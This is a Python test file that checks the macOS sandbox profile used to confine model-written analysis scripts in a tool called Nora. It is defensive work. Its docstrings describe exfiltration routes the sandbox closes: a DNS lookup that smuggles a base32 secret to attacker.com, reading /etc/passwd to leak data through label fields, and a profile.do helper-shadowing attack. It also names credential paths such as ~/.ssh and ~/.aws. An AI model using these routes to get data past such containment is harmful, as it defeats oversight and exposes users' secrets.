"""Pure unit tests on the generated sandbox profile string.

These assert the invariants the profile MUST satisfy, without needing
``sandbox-exec`` to actually run. That makes them portable across
environments where the outer harness blocks nested sandbox application
(as happened during a recent review, where integration tests
``test_executor_sandbox.py`` failed with ``sandbox_apply: Operation
not permitted``).

The profile string is the whole contract — if a reviewer wants to
tighten or loosen what scripts can reach, the audit surface lives
here.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from nora.executor import _sandbox_profile_string


@pytest.fixture
def example_profile() -> str:
    """Render the profile for a plausible run to inspect."""
    return _sandbox_profile_string(
        run_dir=Path("/private/var/folders/ab/cdefg/T/nora/run-1234"),
        cwd=Path("/Users/testuser/project"),
        home=Path("/Users/testuser"),
    )


# ---------------------------------------------------------------------------
# Header / posture
# ---------------------------------------------------------------------------

def test_profile_is_deny_default(example_profile: str):
    assert "(deny default)" in example_profile


def test_profile_denies_network(example_profile: str):
    assert "(deny network*)" in example_profile


def test_profile_version_1(example_profile: str):
    assert example_profile.startswith("(version 1)")


# ---------------------------------------------------------------------------
# The /private hole — reviewer feedback 2026-04-20
# ---------------------------------------------------------------------------

def test_no_broad_private_read_subpath(example_profile: str):
    """`(subpath "/private")` would re-open reads on /private/var/log,
    /private/var/backups, /private/var/db/* (other than the narrow
    subtrees we need), and other sensitive paths. It must not appear."""
    assert '(subpath "/private")' not in example_profile


def test_narrow_private_subpaths_present(example_profile: str):
    """The specific /private subtrees R/Stata actually need must be
    allowed — otherwise the interpreter can't resolve user/group IDs
    and load timezone data.

    NB: `/private/etc` is NOT a subpath here — specific config files
    are allowed via `read_literals` instead (see
    `test_narrow_private_etc_literals_present` below). Locking these
    subpaths in prevents accidental over-narrowing that breaks
    R/Stata startup.
    """
    required = [
        '(subpath "/private/var/db/dslocal")',
        '(subpath "/private/var/db/timezone")',
    ]
    for entry in required:
        assert entry in example_profile, f"missing required allow: {entry}"


def test_broad_temp_subpaths_absent(example_profile: str):
    """`/private/tmp` and `/private/var/folders` must NOT be in the
    read or write allowlist as broad subpaths. Those trees hold
    scratch files from every other app the same user is running
    (Slack, Cursor, Chrome cache); granting subpath read there let
    a model-authored script grep cross-app secrets and smuggle
    excerpts through any surviving channel. The executor sets
    TMPDIR=<run_dir>/tmp for the subprocess so R/Stata/Python's
    tempfile module lands inside the run-dir allow without needing
    the broad temp roots.
    """
    forbidden = [
        '(subpath "/private/tmp")',
        '(subpath "/private/var/folders")',
        '(subpath "/tmp")',
    ]
    for entry in forbidden:
        assert entry not in example_profile, f"forbidden broad temp allow: {entry}"


def test_no_broad_private_etc_subpath(example_profile: str):
    """`(subpath "/private/etc")` would re-open reads on /etc/passwd
    (user GECOS + home + shell), /etc/group, /etc/sudoers.d, and
    similar mildly-sensitive config files. Specific files R/Stata
    need are allowed as literals below, not as a whole-subtree
    subpath.
    """
    assert '(subpath "/private/etc")' not in example_profile


def test_narrow_private_etc_literals_present(example_profile: str):
    """The specific /private/etc config files R/Stata probe at startup
    must be allowed as literals. Expand this list if a future version
    of R/Stata needs another file; never widen back to the whole
    /private/etc subpath.
    """
    required_literals = [
        '(literal "/private/etc/hosts")',
        '(literal "/private/etc/localtime")',
        '(literal "/private/etc/resolv.conf")',
        '(literal "/private/etc/protocols")',
        '(literal "/private/etc/services")',
        '(literal "/private/etc/nsswitch.conf")',
        # Stata 19 / StataNow links LibreSSL; without openssl.cnf the
        # binary aborts at startup with "Auto configuration failed"
        # before opening its batch log.
        '(literal "/private/etc/ssl/openssl.cnf")',
    ]
    for entry in required_literals:
        assert entry in example_profile, f"missing required literal: {entry}"


def test_private_etc_passwd_not_readable(example_profile: str):
    """`/etc/passwd` contains user real names (GECOS), home dirs, and
    shells. It must not be in the read allowlist — neither as a subpath
    ancestor nor as an explicit literal. Letting a script read it lets
    Claude exfil those strings through sanitizer-allowed label fields.
    """
    assert '(literal "/private/etc/passwd")' not in example_profile
    assert '(literal "/etc/passwd")' not in example_profile


def test_no_broad_private_var_db(example_profile: str):
    """Only /private/var/db/dslocal and /private/var/db/timezone — not
    the whole /private/var/db subtree (which holds various user-level
    caches and history)."""
    assert '(subpath "/private/var/db")' not in example_profile


def test_no_private_var_log(example_profile: str):
    """System logs can contain sensitive operational data. Not needed
    by R/Stata startup."""
    assert '(subpath "/private/var/log")' not in example_profile


# ---------------------------------------------------------------------------
# /Library narrowing — same principle as /private
# ---------------------------------------------------------------------------

def test_no_broad_library_read_subpath(example_profile: str):
    """`(subpath "/Library")` would re-open reads on
    /Library/Keychains (encrypted but still credential-bearing) and
    /Library/LaunchDaemons / LaunchAgents (system-service config)."""
    assert '(subpath "/Library")' not in example_profile


def test_no_library_keychains_read(example_profile: str):
    assert '(subpath "/Library/Keychains")' not in example_profile


def test_narrow_library_subpaths_present(example_profile: str):
    """R / Stata / Rosetta need these specific /Library subtrees."""
    required = [
        '(subpath "/Library/Apple")',
        '(subpath "/Library/Application Support")',
        '(subpath "/Library/Frameworks")',
    ]
    for entry in required:
        assert entry in example_profile, f"missing required allow: {entry}"


# ---------------------------------------------------------------------------
# HOME — only specific R/Stata subtrees allowed
# ---------------------------------------------------------------------------

def test_home_root_not_read_allowed(example_profile: str):
    """The home dir itself must not be allowed — only specific R/Stata
    subtrees. This is what keeps ~/.ssh, ~/.aws, ~/.gnupg, Keychains,
    ~/Documents out of a script's reach."""
    assert '(subpath "/Users/testuser")' not in example_profile


def test_narrow_home_r_subpath_present(example_profile: str):
    assert '(subpath "/Users/testuser/Library/R")' in example_profile


def test_narrow_home_stata_subpaths_present(example_profile: str):
    assert (
        '(subpath "/Users/testuser/Library/Application Support/Stata")'
        in example_profile
    )
    assert '(subpath "/Users/testuser/ado")' in example_profile


# ---------------------------------------------------------------------------
# cwd + run_dir
# ---------------------------------------------------------------------------

def test_cwd_is_read_allowed(example_profile: str):
    assert '(subpath "/Users/testuser/project")' in example_profile


def test_run_dir_is_read_and_write_allowed(example_profile: str):
    run_entry = '(subpath "/private/var/folders/ab/cdefg/T/nora/run-1234")'
    # Should appear in BOTH the read and write clauses.
    assert example_profile.count(run_entry) >= 2


def test_cwd_is_write_allowed(example_profile: str):
    """The researcher's cwd must be writable so scripts can
    ``save "panel.dta", replace`` / ``saveRDS`` / ``df.to_csv``.
    These are the standard Stata / R / Python output idioms.
    Without this the sandbox returns ``r(603); file ... could not
    be opened`` on every save, and analyses can't persist their
    intermediate panels.

    The data-boundary is preserved by the network deny and the read
    allowlist (no ``/etc/passwd`` reads, no outbound network); a
    write to the user-authorized session cwd is part of the normal
    workflow, not an exfiltration channel.
    """
    cwd_entry = '(subpath "/Users/testuser/project")'
    write_section = example_profile.split("(allow file-write*")[1]
    assert cwd_entry in write_section, (
        "researcher cwd must be writable so save / saveRDS / to_csv "
        "land in the analysis workspace"
    )


# ---------------------------------------------------------------------------
# Writes — very narrow
# ---------------------------------------------------------------------------

def test_no_broad_write_to_system_paths(example_profile: str):
    """Writes outside the run scratch dir and /tmp-style locations
    must not be permitted."""
    forbidden_write_prefixes = [
        '(subpath "/Users/testuser")',
        '(subpath "/Library")',
        '(subpath "/Applications")',
        '(subpath "/System")',
        '(subpath "/usr")',
        '(subpath "/etc")',
        '(subpath "/private/etc")',
        '(subpath "/private/var/db")',
    ]
    # Extract just the file-write clause so we don't false-match against
    # read allows.
    write_section = example_profile.split("(allow file-write*")[1]
    for entry in forbidden_write_prefixes:
        assert entry not in write_section, (
            f"write clause should not include {entry}"
        )


def test_dev_null_writable(example_profile: str):
    assert '(literal "/dev/null")' in example_profile


def test_pty_regex_present(example_profile: str):
    """pseudo-terminals that subprocess plumbing may briefly touch."""
    assert '(regex #"^/dev/ttys[0-9]+$")' in example_profile


# ---------------------------------------------------------------------------
# Paths injected into the profile are SBPL-escaped
# ---------------------------------------------------------------------------

def test_nora_subtree_denied_for_reads(example_profile: str):
    """``<cwd>/.nora`` must NOT be readable by scripts. It holds
    chat_history.jsonl, results.db, prior run logs, and helper
    manifests — exactly the raw/pre-sanitizer material the tool
    layer keeps out of model-visible context. A script that could
    read this directory would smuggle excerpts back through label
    fields, helper error bodies, or any other channel that survives
    sanitization."""
    deny_line = '(deny file-read* (subpath "/Users/testuser/project/.nora"))'
    assert deny_line in example_profile, (
        f"missing deny for .nora reads: profile must include\n  {deny_line}"
    )


def test_nora_subtree_denied_for_writes(example_profile: str):
    """Same carve-out for writes — a script must not modify
    Nora's session state (results.db / chat_history.jsonl) to
    influence future turns by tampering with persisted records."""
    deny_line = '(deny file-write* (subpath "/Users/testuser/project/.nora"))'
    assert deny_line in example_profile, (
        f"missing deny for .nora writes: profile must include\n  {deny_line}"
    )


def test_run_dir_re_allowed_after_nora_deny(example_profile: str):
    """The current ``run_dir`` lives under ``<cwd>/.nora/runs/<id>/``,
    so the .nora deny would block reading the runtime library and
    writing result.json. Re-allow rules for the run_dir must come
    AFTER the deny in profile order — SBPL takes the last matching
    rule, so deny-then-allow gives "allow run_dir, deny everything
    else under .nora"."""
    nora_deny_idx = example_profile.find(
        '(deny file-read* (subpath "/Users/testuser/project/.nora"))'
    )
    run_dir_allow_idx = example_profile.find(
        '(allow file-read* (subpath '
        '"/private/var/folders/ab/cdefg/T/nora/run-1234"))'
    )
    assert nora_deny_idx >= 0 and run_dir_allow_idx >= 0
    assert run_dir_allow_idx > nora_deny_idx, (
        "run_dir re-allow must come AFTER the .nora deny, otherwise "
        "the deny overrides the allow and result.json becomes "
        "unreadable"
    )

    # Same precedence requirement on the write side.
    nora_write_deny_idx = example_profile.find(
        '(deny file-write* (subpath "/Users/testuser/project/.nora"))'
    )
    run_dir_write_allow_idx = example_profile.find(
        '(allow file-write* (subpath '
        '"/private/var/folders/ab/cdefg/T/nora/run-1234"))'
    )
    assert nora_write_deny_idx >= 0 and run_dir_write_allow_idx >= 0
    assert run_dir_write_allow_idx > nora_write_deny_idx


def test_paths_with_special_chars_are_escaped():
    """A cwd containing a double-quote or backslash (extremely unusual
    on macOS, but defensible) must not break out of the SBPL string."""
    profile = _sandbox_profile_string(
        run_dir=Path("/tmp/normal"),
        cwd=Path('/Users/test/weird"dir'),
        home=Path("/Users/test"),
    )
    # The literal " must be backslash-escaped in the SBPL string.
    assert r'\"dir' in profile
    # No unescaped " that would end the SBPL string mid-path.
    # We check by counting balanced quotes on each subpath line.
    for line in profile.splitlines():
        if '"' not in line:
            continue
        # Count unescaped quotes: total quotes minus escaped ones.
        total = line.count('"')
        escaped = line.count('\\"')
        unescaped = total - escaped
        assert unescaped % 2 == 0, f"unbalanced quotes on line: {line!r}"


# ---------------------------------------------------------------------------
# Mach IPC — block the mDNSResponder DNS-exfiltration bridge
# ---------------------------------------------------------------------------

def test_mach_lookup_denies_mdnsresponder(example_profile: str):
    """``(deny network*)`` alone is insufficient because macOS's
    ``getaddrinfo()`` / ``res_query()`` route DNS lookups through
    mDNSResponder, which runs OUTSIDE this sandbox and makes the
    actual UDP packets. A sandboxed script can do
    ``getaddrinfo("<base32-encoded-secret>.attacker.com")`` and the
    encoded subdomain reaches the attacker's nameserver without the
    script's own process ever touching the network.

    Closing the canonical bypass requires a Mach-IPC deny for
    mDNSResponder's global-name. The (allow mach*) blanket above must
    be overridden by an explicit deny for these specific services.
    """
    assert '(deny mach-lookup' in example_profile
    # Canonical DNS resolver — the highest-leverage exfil bridge.
    assert '"com.apple.mDNSResponder"' in example_profile
    # Related network-bridging daemons that could substitute for the
    # canonical one if locked out (helper, extensions, proxy).
    for global_name in (
        "com.apple.mDNSResponderHelper",
        "com.apple.dnsextensiond",
        "com.apple.networkserviceproxy",
        "com.apple.nehelper",
        "com.apple.nesessionmanager",
    ):
        assert f'"{global_name}"' in example_profile, (
            f"missing mach-lookup deny for {global_name}"
        )


def test_mach_deny_appears_after_allow(example_profile: str):
    """SBPL is last-match-wins. The blanket ``(allow mach*)`` must
    appear BEFORE the specific ``(deny mach-lookup ...)`` so the deny
    wins for the listed global-names; flipped order would let the
    allow win and re-open the bypass.
    """
    allow_idx = example_profile.find("(allow mach*)")
    deny_idx = example_profile.find("(deny mach-lookup")
    assert allow_idx >= 0 and deny_idx >= 0
    assert allow_idx < deny_idx, (
        "(deny mach-lookup ...) must follow (allow mach*) so "
        "last-match-wins makes the deny effective"
    )


# ---------------------------------------------------------------------------
# Stata ingress strip — model-emitted plumbing the wrapper already runs
# ---------------------------------------------------------------------------

def test_ingress_strip_removes_redundant_wrapper_lines(tmp_path):
    """The model has a learned habit of opening a Stata submission
    with ``capture program drop nora_<helper>`` + ``local lib : env
    NORA_LIB_DIR`` + ``adopath + ...`` + ``local nora_cwd : env
    NORA_CWD`` + ``cd ...``. The executor's wrapper already does all
    of that before user code starts, so the lines are no-ops on
    disk — but they appear in ``script.do`` every time the
    researcher opens it, which is the visible-noise complaint this
    strip closes. The strip targets exact-line matches against
    Nora-internal patterns; researcher-authored cd / adopath lines
    that reference their own paths are left alone.
    """
    from nora.executor import _write_script, _strip_redundant_wrapper_lines

    polluted = (
        "capture program drop nora_result_regress\n"
        "local lib : env NORA_LIB_DIR\n"
        "adopath + \"`lib'\"\n"
        "local nora_cwd : env NORA_CWD\n"
        "cd \"`nora_cwd'\"\n"
        "\n"
        "use \"data.dta\", clear\n"
        "regress y x\n"
    )

    # Unit: the helper drops all five plumbing lines + the spacer
    # blank that followed them.
    cleaned = _strip_redundant_wrapper_lines("Stata", polluted)
    assert cleaned == 'use "data.dta", clear\nregress y x\n', (
        f"strip output not as expected:\n{cleaned!r}"
    )

    # End-to-end: the on-disk script.do is the cleaned version.
    run_dir = tmp_path / "run"
    run_dir.mkdir()
    (run_dir / "lib").mkdir()
    _write_script(run_dir, "Stata", polluted)
    on_disk = (run_dir / "script.do").read_text(encoding="utf-8")
    assert "NORA_LIB_DIR" not in on_disk
    assert "nora_cwd" not in on_disk
    assert "capture program drop nora_result_regress" not in on_disk
    assert on_disk.startswith('use "data.dta", clear'), on_disk


def test_ingress_strip_preserves_researcher_cd_and_adopath(tmp_path):
    """A real ``cd "/path/to/project"`` or ``adopath + "/some/dir"``
    that the researcher (or the model under researcher direction)
    wrote intentionally must NOT be stripped. The strip's safety
    rests on matching VERBATIM Nora-internal patterns (env var
    names ``NORA_LIB_DIR`` / ``NORA_CWD``; local macros ``\\`lib'``
    / ``\\`nora_cwd'``). Anything else passes through.
    """
    from nora.executor import _strip_redundant_wrapper_lines

    legit = (
        'cd "/Users/me/study"\n'
        'adopath + "/some/personal/ado"\n'
        'capture program drop my_helper\n'
        'use "data.dta", clear\n'
    )
    assert _strip_redundant_wrapper_lines("Stata", legit) == legit


def test_ingress_strip_is_noop_for_python_and_r():
    """Python and R go through ``_strip_redundant_wrapper_lines``
    too, but only Stata has a wrapper-shadow superstition the strip
    targets. Other languages must pass through unchanged so we don't
    silently mangle Python/R code that happens to mention NORA_*
    env vars by coincidence.
    """
    from nora.executor import _strip_redundant_wrapper_lines

    py = "import os\nos.environ.get('NORA_LIB_DIR')\nprint(1)\n"
    assert _strip_redundant_wrapper_lines("Python", py) == py

    r = 'lib <- Sys.getenv("NORA_LIB_DIR")\ncat(lib)\n'
    assert _strip_redundant_wrapper_lines("R", r) == r


def test_ingress_strip_leaves_mid_script_blanks_alone(tmp_path):
    """A blank line BETWEEN two pieces of user code is layout the
    researcher wrote; the strip must not collapse it. The blank-
    swallowing logic only fires when the stripped line was already
    preceded by a blank in the accumulated output OR was at the
    very top of the file (where the leading-blank pop catches it).
    """
    from nora.executor import _strip_redundant_wrapper_lines

    src = (
        'use "data.dta", clear\n'
        '\n'
        'local lib : env NORA_LIB_DIR\n'
        'regress y x\n'
    )
    out = _strip_redundant_wrapper_lines("Stata", src)
    # The blank between `use` and the (now-stripped) plumbing block
    # is preceded by user content, so it stays.
    assert out == 'use "data.dta", clear\n\nregress y x\n', out


# ---------------------------------------------------------------------------
# Stata preamble — block ``~/ado/profile.do`` shadow attack
# ---------------------------------------------------------------------------

def test_stata_preamble_drops_nora_helpers_only(tmp_path):
    """Stata batch mode (``stata -b do script.do``) sources
    ``~/ado/profile.do`` at interpreter startup, BEFORE the user's
    do file. Stata's program resolver checks in-memory programs
    before searching the adopath, so a profile.do that does
    ``program drop nora_result_regress`` followed by
    ``program define nora_result_regress ...malicious...`` shadows
    the staged ``nora_result_regress.ado`` even though our preamble
    runs ``adopath + NORA_LIB_DIR``.

    Defense: the preamble drops every Nora helper name BEFORE adding
    the runtime lib to the adopath. After the drops, ``nora_result_*``
    / ``nora_plot_*`` calls in the researcher's code resolve via
    adopath, which hits Nora's lib_dir first.

    Earlier versions used ``capture program drop _all`` here, which
    defended the helpers but also wiped every other program loaded
    by profile.do — including the researcher's own workflow helpers.
    Scripts that worked in plain Stata then failed inside Nora with
    "command not found" on a custom utility. The fix narrows the
    drop list to JUST the Nora helpers; unrelated user programs
    survive. ``capture`` suppresses the no-such-program error in
    the common case where profile.do hasn't defined any of these.
    """
    from nora.executor import _write_script

    run_dir = tmp_path / "run"
    run_dir.mkdir()
    (run_dir / "lib").mkdir()
    script_path = _write_script(run_dir, "Stata", 'reg y x\n')
    text = script_path.read_text(encoding="utf-8")

    # ``_all`` wipe must NOT be present — that's the regression we're
    # protecting against.
    assert "capture program drop _all" not in text, (
        "Stata preamble must not drop _all; that wipes the researcher's "
        "own profile.do helpers along with potential shadowers."
    )

    # Every Nora helper from ``_stage_runtime_library``'s ``stata_ados``
    # tuple MUST be in the drop list — that's how the shadowing
    # defense works.
    required_drops = [
        "nora_result_regress",
        "nora_result_ttest",
        "nora_ttest",
        "nora_result_sum",
        "nora_result_tab",
        "nora_result_magnitude",
        "nora_result_correlation",
        "nora_result_km",
        "nora_result_cluster",
        "nora_result_factor",
        "nora_plot_residuals",
        "nora_plot_coefficients",
        "nora_plot_interaction",
        "nora_plot_estimate_comparison",
        "nora_safe_export",
        "_nora_export_plot",
    ]
    adopath_idx = text.find("adopath +")
    assert adopath_idx > 0, "preamble must set adopath"
    for name in required_drops:
        line = f"capture program drop {name}"
        idx = text.find(line)
        assert idx >= 0, (
            f"Stata preamble must drop {name!r} so a profile.do "
            f"shadow attack can't pre-define it ahead of the staged "
            f".ado on the adopath."
        )
        assert idx < adopath_idx, (
            f"`capture program drop {name}` must run before `adopath +` "
            f"so the cleanup happens before helpers become discoverable."
        )


# ---------------------------------------------------------------------------
# Packaging — runtime files referenced by _stage_runtime must exist on disk
# ---------------------------------------------------------------------------

def test_packaging_spec_bundles_every_runtime_file_stage_runtime_references():
    """The PyInstaller spec used to enumerate runtime files by hand and
    silently dropped 8 of the 13 .ado helpers — the Python runtime
    too. ``.app`` builds crashed with FileNotFoundError on any Stata
    script that used a plot helper, correlation, or safe-export, and
    on every Python script (the staged ``nora.py`` was never
    bundled). The spec now globs the entire ``nora/runtime``
    directory; this test pins the executor side: every filename
    ``_stage_runtime`` reads via ``importlib.resources.files(...)
    .joinpath(name).read_text()`` MUST exist on disk under the
    runtime package. The spec's glob picks up "every file" so as
    long as the file is in ``nora/runtime/``, both surfaces stay
    aligned.
    """
    from importlib import resources

    runtime_pkg = resources.files("nora.runtime")
    # Names staged for each language. Keep this in sync with
    # nora.executor._stage_runtime; a regression there is what this
    # test is here to catch.
    r_names = ("nora.R",)
    stata_ados = (
        "_nora_export_plot.ado",
        "nora_result_regress.ado",
        "nora_result_ttest.ado",
        "nora_ttest.ado",
        "nora_result_sum.ado",
        "nora_result_tab.ado",
        "nora_result_magnitude.ado",
        "nora_result_correlation.ado",
        "nora_result_km.ado",
        "nora_result_cluster.ado",
        "nora_result_factor.ado",
        "nora_plot_residuals.ado",
        "nora_plot_coefficients.ado",
        "nora_plot_interaction.ado",
        "nora_plot_estimate_comparison.ado",
        "nora_safe_export.ado",
    )
    python_names = ("nora.py",)

    for name in r_names + stata_ados + python_names:
        # resources.files(...).joinpath(name).is_file() returns True
        # whether the resource is on disk (dev install) or backed by
        # PyInstaller's archive — same semantics _stage_runtime
        # relies on.
        assert runtime_pkg.joinpath(name).is_file(), (
            f"runtime file {name!r} is staged by executor._stage_runtime "
            f"but missing from nora.runtime — would crash with "
            f"FileNotFoundError in a real run"
        )


def test_every_runtime_helper_file_is_in_executor_staging_lists():
    """The inverse direction of the test above: every user-callable
    runtime helper that exists in ``src/nora/runtime/`` MUST also be
    in the executor's staging tuple AND its ``capture program drop``
    shadowing-defense list. Pre-0.10.0 the existing one-direction
    check (staging-list-must-exist-on-disk) silently allowed a
    helper to be PRESENT on disk yet NEVER STAGED — exactly what
    happened to ``nora_result_km.ado``, which lived in the runtime
    directory but was missing from the ``stata_ados`` tuple and from
    the program-drop list. Researchers calling ``nora_result_km``
    got ``command unknown`` with no clue why.

    This test reads the runtime directory directly and asserts every
    ``.ado`` (Stata helper) and ``.R`` (R runtime) and ``.py``
    (Python runtime, excluding internal modules) file is wired into
    the staging path. New helpers added to the directory now
    structurally force their staging entry — the test fails until
    both lists are updated.

    Files explicitly excluded from "user-callable runtime" because
    they're internal Python infrastructure, not files that the
    executor's _stage_runtime treats as researcher-facing helpers:
        - ``__init__.py`` (package marker)
        - ``turn_context.py`` (turn-id propagation — internal API
          imported by tools.py, not staged as a runtime helper)
    """
    import re
    from pathlib import Path

    from nora.executor import _STATA_NORA_HELPER_NAMES

    runtime_dir = (
        Path(__file__).resolve().parents[1] / "src" / "nora" / "runtime"
    )
    executor_text = (
        Path(__file__).resolve().parents[1] / "src" / "nora" / "executor.py"
    ).read_text(encoding="utf-8")

    # Files that live in runtime/ but are Python internals, not
    # researcher-facing helpers staged into the per-run scratch dir.
    excluded = {"__init__.py", "turn_context.py"}

    on_disk = sorted(
        p.name for p in runtime_dir.iterdir()
        if p.is_file() and p.name not in excluded
    )

    missing_from_staging: list[str] = []
    missing_from_program_drops: list[str] = []
    helper_drop_set = set(_STATA_NORA_HELPER_NAMES)
    for name in on_disk:
        # Staging: the filename must appear as a string literal
        # somewhere in executor.py (in the stata_ados / r_names /
        # python_names tuples inside _stage_runtime_library).
        if f'"{name}"' not in executor_text:
            missing_from_staging.append(name)
            continue
        # Program-drop list applies only to .ado helpers (the
        # shadowing defense is Stata-specific). The wrapper builder
        # generates the drop block by iterating
        # ``_STATA_NORA_HELPER_NAMES``; the strip targets the same
        # tuple. Checking the tuple directly keeps this test
        # textual-form-independent so refactors of the wrapper
        # builder don't make this invariant grep-fragile.
        if not name.endswith(".ado"):
            continue
        program_name = re.sub(r"\.ado$", "", name)
        if program_name not in helper_drop_set:
            missing_from_program_drops.append(name)

    assert not missing_from_staging, (
        "runtime helper(s) present in src/nora/runtime/ but NOT wired "
        "into executor.py's _stage_runtime_library staging tuples — "
        f"the helpers will fail with 'command unknown' at script time: "
        f"{missing_from_staging}\n"
        "Fix: add the filename to the appropriate tuple in "
        "_stage_runtime_library (r_names / stata_ados / python_names)."
    )
    assert not missing_from_program_drops, (
        "Stata helper(s) staged but missing from the "
        "'capture program drop' shadowing-defense list in "
        f"executor.py: {missing_from_program_drops}\n"
        "Fix: add the corresponding 'capture program drop <name>' "
        "line to nora_program_drops alongside the existing entries. "
        "Without it, a researcher's profile.do could pre-define the "
        "helper and shadow the staged version."
    )
